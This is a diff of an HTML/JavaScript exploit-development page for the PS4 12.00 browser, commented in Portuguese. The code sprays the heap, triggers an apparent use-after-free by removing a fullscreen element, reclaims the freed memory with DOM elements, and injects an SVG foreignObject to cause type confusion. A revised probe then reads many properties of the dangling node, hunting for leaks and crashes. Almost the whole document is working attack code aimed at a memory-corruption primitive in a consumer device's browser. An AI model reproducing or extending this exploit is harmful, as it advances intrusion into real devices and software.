@@ -1,42 +1,44 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Cross Contamination Probe</title>
+<title>PS4 12.00 - Massive C++ Probe</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Attribute Contamination → Target Lock</h2>
+<h2>UAF → SVG Confusion → Massive C++ Probe</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 SAFE LOG
+// 🔒 LOG SEGURO
+// ==========================
 let logBuffer = [];
-function log(msg){
+function log(msg) {
     try { console.log(msg); } catch(e){}
     logBuffer.push(msg);
 }
 
 // ==========================
-// HEAP SETUP ORIGINAL (100% INALTERADO)
-function setupHeap(){
-    let arr=[];
-    for(let i=0;i<5000;i++){
-        let a=new Float64Array(8);
-        a[0]=i;
-        arr.push(a);
+// HEAP SETUP (INALTERADO)
+// ==========================
+function setupHeap() {
+    let controllers = [];
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
     }
-    return arr;
+    return controllers;
 }
 
 // ==========================
-// FULLSCREEN (100% INALTERADO)
-function setupFullscreen(){
-    let fsTarget=document.createElement("div");
-    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+// FULLSCREEN (INALTERADO)
+// ==========================
+function setupFullscreen() {
+    let fsTarget = document.createElement("div");
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
     Object.assign(fsTarget.style,{
         background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
     });
@@ -46,23 +48,28 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 RECLAIM (100% INALTERADO)
-function reclaim(size){
+// 💣 RECLAIM (Mistura do seu ajuste fino com a estabilidade original)
+// ==========================
+function preciseReclaim(size) {
     log("[*] Reclaim size = " + size);
-    for(let i=0;i<3000;i++){
-        let e=document.createElement("div");
-        document.body.appendChild(e);
-        e.remove();
+    for (let i = 0; i < 3000; i++) {
+        let el = document.createElement("div");
+        document.body.appendChild(el);
+        el.remove();
     }
-    for(let i=0;i<size;i++){
-        let e=document.createElement("div");
-        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
-        document.body.appendChild(e);
+    for (let i = 0; i < size; i++) {
+        let el = document.createElement("div");
+        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "</h1>";
+        Object.assign(el.style,{
+            background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
+        });
+        document.body.appendChild(el);
     }
 }
 
 // ==========================
-// 💥 SVG CONFUSION (100% INALTERADO)
+// 💥 SVG CONFUSION (O GATILHO ESTÁ DE VOLTA!)
+// ==========================
 function inject(child){
     try{
         child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
@@ -73,105 +80,144 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 CONTAMINATION PROBE (O SCANNER DE GÊMEOS)
-function domOverlapProbe(fsTarget){
-    log("---- CROSS CONTAMINATION PROBE ----");
+// 🔬 MASSIVE PROBE (O TESTE ABSOLUTO)
+// ==========================
+function massiveProbe(fsTarget) {
+    log("---- MASSIVE PROBE ----");
 
-    try{
+    try {
         let n = fsTarget.firstChild;
-        if(!n) return;
-
-        if(n.nodeType === 1){
-            log("[!] Zumbi isolado. Carimbando atributo invisível...");
-
-            // 🔥 A MÁGICA: Nós gravamos uma assinatura no zumbi SVG
-            try {
-                n.setAttribute("data-zumbi", "1337");
-                log("[+] Atributo 'data-zumbi' escrito no fantasma!");
-            } catch(e) {
-                log("[UAF] Erro ao carimbar atributo");
-            }
-
-            // ==========================
-            // 🔥 A CAÇADA (Quem herdou o atributo fisicamente?)
-            log("[*] Varrendo o Reclaim em busca do hospedeiro...");
-            
-            let h1s = document.getElementsByTagName("h1");
-            let divs = document.getElementsByTagName("div");
-            
-            // 1. Checando os H1s
-            for(let i=0; i<h1s.length; i++){
-                // Se o H1 ganhou o atributo do SVG, eles são a mesma memória!
-                if(h1s[i].getAttribute("data-zumbi") === "1337"){
-                    log("[$$$] TARGET LOCKED! O Zumbi está sobrepondo o H1 [" + i + "]!");
-                    return;
-                }
-                // Se o texto do H1 corrompeu, o zumbi sobrepôs o TextNode!
-                if(h1s[i].innerHTML && h1s[i].innerHTML.includes("CONTROL") === false && !h1s[i].innerHTML.includes("FULLSCREEN")){
-                    log("[$$$] TARGET LOCKED! O Zumbi esmagou o TextNode do H1 [" + i + "]!");
-                    return;
-                }
-            }
-
-            // 2. Checando as DIVs
-            for(let i=0; i<divs.length; i++){
-                // Ignora o Fullscreen e controles limpos
-                if(divs[i].innerHTML.includes("FULLSCREEN")) continue;
-
-                // Se a DIV ganhou o atributo, a conexão é nela!
-                if(divs[i].getAttribute("data-zumbi") === "1337"){
-                    log("[$$$] TARGET LOCKED! O Zumbi está sobrepondo uma DIV de controle!");
-                    return;
-                }
-            }
-            
-            log("[SCAN] Hospedeiro não identificado neste ciclo.");
+        if (!n) {
+            log("[!] Zumbi sumiu!");
+            return;
         }
-    }catch(e){
-        log("[UAF] Probe total crash");
+
+        // Se for o SVG (Tipo 1), começamos o bombardeio
+        if(n.nodeType === 1) {
+            
+            // 1. BATERIA DE STRINGS E CONTEÚDO
+            try { 
+                let html = n.innerHTML; 
+                if(html && !html.includes("foreignObject")) log("[LEAK] innerHTML modificado: " + html.substring(0, 30));
+            } catch(e) { log("[CRASH] innerHTML"); }
+
+            try { 
+                let outer = n.outerHTML; 
+                if(outer && !outer.includes("svg")) log("[LEAK] outerHTML corrompido!");
+            } catch(e) { log("[CRASH] outerHTML"); }
+
+            // 2. BATERIA DE ÁRVORE E PONTEIROS (DOM Tree)
+            try { 
+                let p = n.parentNode; 
+                if(p !== fsTarget) log("[LEAK] parentNode aponta pro além!");
+            } catch(e) { log("[CRASH] parentNode"); }
+
+            try { 
+                let cLen = n.childNodes.length; 
+                if(cLen > 10 || cLen === 0) log("[LEAK] childNodes length louco: " + cLen);
+            } catch(e) { log("[CRASH] childNodes"); }
+
+            // 3. BATERIA DE ATRIBUTOS
+            try { 
+                let id = n.id; 
+                if(id) log("[LEAK] id: " + id);
+            } catch(e) { log("[CRASH] id"); }
+
+            try { 
+                let cls = n.className; 
+                let cVal = cls.baseVal || cls;
+                if(typeof cVal === 'string' && cVal.length > 0) log("[LEAK] className: " + cVal.substring(0,20));
+            } catch(e) { log("[CRASH] className"); }
+
+            // 4. BATERIA DE LAYOUT C++ (RenderTree)
+            try { 
+                let h = n.offsetHeight; 
+                if(h > 5000 || h < 0) log("[LEAK] offsetHeight bizarro: " + h);
+            } catch(e) { log("[CRASH] offsetHeight"); }
+
+            try { 
+                let rect = n.getBoundingClientRect(); 
+                if(rect.width > 5000 || rect.width < 0) log("[LEAK] Rect Width bizarro: " + rect.width);
+            } catch(e) { log("[CRASH] getBoundingClientRect"); }
+
+            // 5. BATERIA ESPECÍFICA SVG (Matemática C++)
+            try { 
+                let scale = n.currentScale; 
+                if(scale !== 1 && scale !== 0) log("[LEAK] currentScale: " + scale);
+            } catch(e) { log("[CRASH] currentScale"); }
+
+            try { 
+                let tx = n.currentTranslate.x; 
+                if(tx !== 0) log("[LEAK] Translate X: " + tx);
+            } catch(e) { log("[CRASH] currentTranslate"); }
+
+            // 6. BATERIA DE EXECUÇÃO (Métodos perigosos)
+            try { n.hasAttributes(); } catch(e) { log("[CRASH] hasAttributes()"); }
+            try { n.cloneNode(false); } catch(e) { log("[CRASH] cloneNode()"); }
+
+        } else {
+            log("[!] Objeto não é um elemento. Tipo: " + n.nodeType);
+        }
+
+    } catch(e) {
+        log("[UAF] Massive Probe falhou catastroficamente");
     }
 }
 
 // ==========================
-// TRIGGER (100% INALTERADO)
-function trigger(fsTarget){
+// TRIGGER (INALTERADO)
+// ==========================
+function trigger(fsTarget) {
     log("[*] Trigger");
-    try{
-        fsTarget.remove();
-        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
-    }catch(e){}
 
-    let sizes=[1500,2000,2500,3000];
-    sizes.forEach((s,i)=>{
-        setTimeout(()=>reclaim(s), i*50);
+    try {
+        fsTarget.remove();
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
+            document.webkitExitFullscreen?.();
+        }
+    } catch(e) {
+        log("[ERRO]");
+    }
+
+    // Seu array de tamanhos
+    let sizes = [1500, 2000, 2500, 3000];
+
+    sizes.forEach((size, idx) => {
+        setTimeout(() => preciseReclaim(size), idx * 50);
     });
 
-    setTimeout(()=>{
-        try{
+    // Injeção do Payload que cria o zumbi
+    setTimeout(() => {
+        try {
             let child = fsTarget.firstChild;
             if(child) inject(child);
-        }catch(e){}
+        } catch(e) {}
     }, 30);
 
-    setTimeout(()=>domOverlapProbe(fsTarget), 80);
-    setTimeout(()=>domOverlapProbe(fsTarget), 180);
-    setTimeout(()=>domOverlapProbe(fsTarget), 280);
+    // O bombardeio de Probes
+    setTimeout(() => massiveProbe(fsTarget), 100);
+    setTimeout(() => massiveProbe(fsTarget), 180);
+    setTimeout(() => massiveProbe(fsTarget), 260);
 
-    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
-    setTimeout(()=>location.reload(), 600);
+    setTimeout(() => {
+        alert(logBuffer.join("\n"));
+    }, 450);
+
+    setTimeout(() => location.reload(), 600);
 }
 
 // ==========================
 // MAIN
-function runTest(){
-    log("[*] Iniciando Cross Contamination...");
-    
-    window.heap_press = setupHeap(); 
+// ==========================
+function runTest() {
+    log("[*] Iniciando Massive C++ Probe");
 
-    let fsTarget=setupFullscreen();
-    window.onblur=function(){
+    let controllers = setupHeap();
+    let fsTarget = setupFullscreen();
+
+    window.onblur = function() {
         log("[*] onblur");
-        setTimeout(()=>trigger(fsTarget), 3000);
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
 
